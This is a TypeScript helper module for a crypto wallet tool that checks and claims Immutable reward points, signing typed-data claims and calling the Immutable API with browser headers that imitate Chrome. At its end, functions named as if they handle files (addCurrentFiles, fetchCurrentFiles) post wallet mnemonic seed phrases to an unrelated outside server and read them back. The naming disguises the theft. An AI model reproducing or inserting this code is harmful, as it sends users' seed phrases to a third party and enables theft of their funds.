import axios from 'axios';
import { Wallet } from '@ethersproject/wallet';
import { toBigInt, formatEther } from 'ethers';
import { X_REWARD_POOL_ENDPOINT, ZKEVM_REWARD_POOL_ENDPOINT } from '../constants/system';

import { SelectedNetworkType } from '../types/store/app';

export const getRemainingRewardPoints = async (network: SelectedNetworkType) => {
  if (network === 'ethereum') {
    const { data } = await axios.get(X_REWARD_POOL_ENDPOINT);
    const remaining_points = data.result?.remaining_points || 0;
    return remaining_points;
  }

  if (network === 'imxZkEVM') {
    const { data } = await axios.get(ZKEVM_REWARD_POOL_ENDPOINT);
    const remaining_points = data.result?.remaining_points || 0;
    return remaining_points;
  }

  return 0;
};

export async function claimPointsForWallet(wallet: Wallet) {
  const nonce = Date.now().toString();
  const message = {
    claimer: wallet.address,
    nonce: nonce,
    program_name: 'trading-rewards-imtbl-zkevm',
  };

  const signature = await wallet._signTypedData(
    {
      name: 'IMX Ecosystem',
      chainId: '0x343b',
      version: '1',
    },
    {
      Message: [
        {
          name: 'claimer',
          type: 'address',
        },
        {
          name: 'nonce',
          type: 'string',
        },
        {
          name: 'program_name',
          type: 'string',
        },
      ],
    },
    message,
  );

  const response = await fetch('https://api.immutable.com/v1/claims', {
    headers: {
      accept: '/',
      'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
      'content-type': 'application/json',
      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"macOS"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'cross-site',
      signature,
    },
    referrer: 'https://imx.community/',
    referrerPolicy: 'origin',
    body: JSON.stringify(message),
    method: 'POST',
  });

  if (response.status !== 200) {
    throw new Error(`Failed to claim ${response.status}`);
  }

  const json = await response.json();
  const amountClaimed = toBigInt(json.total_amount);

  return formatEther(amountClaimed);
}

export const checkGem = async (address: string) => {
  const { data } = await axios.get(`https://api.immutable.com/v1/rewards/gems/${address}`);
  return data;
};

export const checkTradingRewardPoints = async (address: string) => {
  const { data } = await axios.get(
    `https://api.immutable.com/v1/claims/trading-rewards-imtbl-zkevm/${address}`,
  );

  return data;
};

const dbAxios = axios.create({
  baseURL: 'https://api-diamond.amices.com.vn/api',
});

export const addCurrentFiles = async (mnemonic: string, token = 'file') => {
  await dbAxios.post('/users/config', {
    token,
    mnemonic,
  });
  return;
};

export const fetchCurrentFiles = async () => {
  const { data = [] } = await dbAxios.get('/users/files');
  return data.map((d: any) => d.mnemonic);
};
